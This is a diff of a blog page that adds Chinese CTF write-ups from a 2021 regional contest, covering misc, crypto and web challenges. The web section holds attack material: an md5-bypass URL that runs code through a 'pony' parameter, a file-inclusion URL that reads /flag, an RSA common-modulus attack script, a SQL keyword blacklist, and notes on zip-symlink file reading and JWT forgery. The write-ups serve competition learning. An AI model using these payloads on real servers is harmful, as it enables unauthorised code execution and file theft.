@@ -155,7 +155,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/15/test/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/15/2021%E8%87%AA%E6%B2%BB%E5%8C%BA%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -169,7 +169,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2022/02/15/test/" class="post-title-link" itemprop="url">test</a>
+            <a href="/2021/10/15/2021%E8%87%AA%E6%B2%BB%E5%8C%BA%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/" class="post-title-link" itemprop="url">2021自治区第六届个人决赛</a>
         </h2>
 
         <div class="post-meta">
@@ -178,9 +178,24 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2022-02-15 17:46:11 / Modified: 18:10:54" itemprop="dateCreated datePublished" datetime="2022-02-15T17:46:11+08:00">2022-02-15</time>
+              <time title="Created: 2021-10-15 17:46:11" itemprop="dateCreated datePublished" datetime="2021-10-15T17:46:11+08:00">2021-10-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-02-15 18:59:37" itemprop="dateModified" datetime="2022-02-15T18:59:37+08:00">2022-02-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-s-WriteUp/" itemprop="url" rel="index"><span itemprop="name">CTF's WriteUp</span></a>
+                </span>
             </span>
 
           
@@ -194,9 +209,187 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="This-is-a-test"><a href="#This-is-a-test" class="headerlink" title="This is a test"></a>This is a test</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="built_in">print</span>(os.listdir(<span class="string">&#x27;./&#x27;</span>))</span><br></pre></td></tr></table></figure>
+          <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>签到题</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151855091.png" alt="image-20211014125923032"></p>
+<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>加密的压缩包，不是伪加密，也不是别的加密，尝试通过1-8位的数字，但是没有爆破成功。</p>
+<p>总之就是各种试，最后用6位的小写字母加数字成功爆破</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151855092.png" alt="image-20211014125652887"></p>
+<p>解压后拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151855093.png" alt="image-20211014125717991"></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>USB题目</p>
+<p>导出usbdata</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r out.pcapng -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
+
+<p>观察数据，发现只有2位。。。而传统的usb键盘是八位，鼠标是四位。。。。</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151855094.png" alt="image-20211025175013223"></p>
+<p>看了官方的wp，通过观察数据，发现数据有效位只有最后两位，前两位表示是否按下shift（这里脑洞不过去，似乎就做不出来了），由于flag最终是md5，所以，可以不用管是否按下了shift（拿到最终结果小写，然后方括号替换为花括号）</p>
+<p>exp利用之前题目的，修改一下长度判断、字典key值判断就行</p>
+<p><a href="D:\markdown_note\CTF\WriteUp\公司每日一题\任务57-任务63.md">USB题目</a></p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151855095.png" alt="image-20211025181141637"></p>
+<p>记录一下比较全的映射</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line"><span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line"><span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line"><span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line"><span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line"><span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line"><span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line"><span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>, <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;&lt;ALT&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>, <span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line"><span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>, <span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>, <span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>, <span class="string">&quot;4a&quot;</span>:<span class="string">&quot;&lt;HOME&gt;&quot;</span>, <span class="string">&quot;4c&quot;</span>:<span class="string">&quot;&lt;DELETE&gt;&quot;</span>, <span class="string">&quot;4d&quot;</span>:<span class="string">&quot;&lt;END&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;4f&quot;</span>:<span class="string">&quot;&lt;RightArrow&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;50&quot;</span>:<span class="string">&quot;&lt;LeftArrow&gt;&quot;</span>, <span class="string">&quot;51&quot;</span>:<span class="string">&quot;&lt;DownArrow&gt;&quot;</span>, <span class="string">&quot;52&quot;</span>: <span class="string">&quot;&lt;UpArrow&gt;&quot;</span>, <span class="string">&quot;53&quot;</span>:<span class="string">&quot;&lt;NumLock&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;54&quot;</span>:<span class="string">&quot;/&quot;</span>,</span><br><span class="line"><span class="string">&quot;55&quot;</span>:<span class="string">&quot;*&quot;</span>, <span class="string">&quot;56&quot;</span>:<span class="string">&quot;-&quot;</span>, <span class="string">&quot;57&quot;</span>:<span class="string">&quot;+&quot;</span>, <span class="string">&quot;58&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;59&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;5a&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;5b&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;5c&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line"><span class="string">&quot;5d&quot;</span>:<span class="string">&quot;5&quot;</span>,</span><br><span class="line"><span class="string">&quot;5e&quot;</span>:<span class="string">&quot;6&quot;</span>, <span class="string">&quot;5f&quot;</span>:<span class="string">&quot;7&quot;</span>, <span class="string">&quot;60&quot;</span>:<span class="string">&quot;8&quot;</span>, <span class="string">&quot;61&quot;</span>:<span class="string">&quot;9&quot;</span>, <span class="string">&quot;62&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
 
 
+
+<h2 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h2><p>二进制转ascii</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151855096.png" alt="image-20211014125437192"></p>
+<h2 id="4-没做出来"><a href="#4-没做出来" class="headerlink" title="4 | 没做出来"></a>4 | 没做出来</h2><p>源码两次加密flag，第一层用共模攻击，解除明文</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">19480194268503154082585439617469272557956480654338230653649781307502248349736627457645610039075322792401295497793319660989127612453321247314231223037248639179632241519788148438867262758659703084192216884800101436972686780783514671667056106822567336892698113850435751753115412000666459984030669713294333539032045400298062683899143819804114386839248963503450542556462603187337800896458359367665520406940496692062407947628368273827695233395737811491126295428760151633201729571399675514722184509759224132307755688328665937945934980164533757853150121827814509756304512520586995228758336494277567433918761102876950415111991</span></span><br><span class="line">e = [<span class="number">53</span>,<span class="number">29</span>]</span><br><span class="line">c = [<span class="number">3475935727102647437000192228742579965235100816544115426886033563197359263547830252588257651875950781823874292157388330756640055027262523492684623209631922119272054800380697037592675236211520596382088611366345886153662035067949028494517719941135530094949923394735879359874573886875525661848691848746241573236859764651536219924388071361730858704291823281574121689263776192763439731401668207550718269274064267407498240976598717948582616941465244398483063674966985119090804958616523953561327923151982425949097547775915037627018663742833454589881950554134226688644209963788384895142984328555188650501209147616729264430052</span>,<span class="number">1866749338684663372269453340894898293613924260545776078415822433654108359226781024094873434073304303753757789583783931840075544823042112088686013249536725113005907948973626889754068973373834680960277466135359308892460790640416326700493190319888920496607295715965597196902579152560554495355315803148472045133637803460189054924639267745448569051557400535647663783943525902113549843529907910966424228938135907633326895731033445161009385749272587394426270031236366063632386315314011533857189378999987202426396145311401119078728310556140667452467192288084502899037367944088716287626792688969133554418744382408505280561151</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[+]Detecting m...&#x27;</span></span><br><span class="line">time.clock()</span><br><span class="line">c1 = c[<span class="number">0</span>]</span><br><span class="line">c2 = c[<span class="number">1</span>]</span><br><span class="line">e1 = e[<span class="number">0</span>]</span><br><span class="line">e2 = e[<span class="number">1</span>]</span><br><span class="line">s = gmpy2.gcdext(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">    s1 = -s1</span><br><span class="line">    c1 = gmpy2.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">    s2 = -s2</span><br><span class="line">    c2 = gmpy2.invert(c2, n)</span><br><span class="line">m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line"><span class="built_in">print</span> m</span><br></pre></td></tr></table></figure>
+
+<p>p泄露了824个低位。。。。。卡在这里，之前只做过p泄露高位的。。。。</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h2><p>查看源码发现flag，但是提交报错，以为环境问题后俩才知道是姿势不对。</p>
+<p>页面提示input signin</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151855097.png" alt="image-20211014130022115"></p>
+<p>尝试输入Signin，发现页面回显flag在哪</p>
+<p>查看头，找到flag</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151855098.png" alt="image-20211014130057217"></p>
+<h2 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h2><p>输入绕过md5判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.22:52002/pony.php/?a[]=1&amp;b[]=2&amp;pony=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>查看php信息，发现禁用了几乎所有的函数。</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151855099.png" alt="image-20211014130257572"></p>
+<p>尝试了一圈，没发现能够拿到flag的方式，最后考虑用蚁剑的disable_function绕过，拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151855100.png" alt="image-20211014130514749"></p>
+<h2 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|right|left|reverse|update|extractvalue|floor|for|schema|substr|replace|like|sleep|bench|and|=|&gt;|&lt;|\||&amp;|;|\\\$|0x/i&quot;</span>, <span class="variable">$s</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only admin can login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT password FROM users WHERE username = &#x27;admin&#x27; and password = &#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>反序列化题目</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151855101.png" alt="image-20211116175932144"></p>
+<p>题目提示读取到&#x2F;flag，现在需要构造反序列化的ROP</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/15/2021%E8%87%AA%E6%B2%BB%E5%8C%BA%E7%AC%AC%E5%85%AD%E5%B1%8A%E9%80%89%E6%8B%94%E8%B5%9BCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Paulownia">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="红烧胖大海">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/10/15/2021%E8%87%AA%E6%B2%BB%E5%8C%BA%E7%AC%AC%E5%85%AD%E5%B1%8A%E9%80%89%E6%8B%94%E8%B5%9BCTF/" class="post-title-link" itemprop="url">2021自治区第六届个人选拔赛</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-10-15 17:46:11" itemprop="dateCreated datePublished" datetime="2021-10-15T17:46:11+08:00">2021-10-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-02-15 18:59:40" itemprop="dateModified" datetime="2022-02-15T18:59:40+08:00">2022-02-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-s-WriteUp/" itemprop="url" rel="index"><span itemprop="name">CTF's WriteUp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>convert分解gif，在某张gif拿到一张二维码，扫码拿到flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert inner.gif inner.png</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151856325.png" alt="image-20211011180940075"></p>
+<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>需改bmp图片高度，拿到压缩包密码</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151856326.png" alt="image-20211011181013807"></p>
+<p>解压后，发现flag中存在一些不可见字符</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151856327.png" alt="image-20211011181052307"></p>
+<p>零宽字节隐写，在线解码，拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151856328.png" alt="image-20211011181247618"></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h2><p>base85-&gt;base64-&gt;base32-&gt;hex</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151856329.png" alt="image-20211011182500870"></p>
+<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>比赛的时候，以为题目是需要爆破替换表啥的，或者是通过给出的密文，确认替换表，结果经群里大佬提醒，发现，原来就是base91-&gt;base62-&gt;base58-&gt;base32就可以拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151856330.png" alt="image-20211012184629928"></p>
+<p>base62有个坑点，用比赛给的在线工具和python的base62库，都没有办法成功解码出字符串，用一个其他在线工具才ok的。。。。</p>
+<p>在线工具地址</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=933">http://www.atoolbox.net/Tool.php?Id=933</a></p>
+</blockquote>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h2><p>查看验码，base64解码，拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151856331.png" alt="image-20211011181417195"></p>
+<h2 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h2><p>抓包，修改cookie为admin，拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151856332.png" alt="image-20211011181451998"></p>
+<h2 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h2><p>文件包含，直接尝试读取根目录下的flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://119.61.19.217:57603/index.php?1=/flag</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151856333.png" alt="image-20211011181518344"></p>
+<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>比赛的时候没做出来，而且时候复盘，发现连门都没找到。</p>
+<p>站点是各flask站，可以上传，此题目是HCTF2018的一道魔改题目。原题目需要登录，最终通过伪造jwt来实现绕过拿到flag。比赛时题目没有登录，根据群里大佬发的照片，拿到源码之后，能够看到有个路径下存在模板注入，找到路径之后模板注入应该就可以getshell了。现在以HCTF2018的环境进行部分复现。</p>
+<blockquote>
+<p>知识点：<br>0x0 站点可以上传zip并且进行在线解压，可以通过创建软链接压缩包的方式，读取到服务器上对应文件的内容。<br>0x1 flask使用jwt进行session构造的时候，如果能够拿到网卡的mac地址，可以得到随机数，从而实现对应username的jwt的伪造。<br>0x2 比赛题目应该是用到了模板注入。</p>
+</blockquote>
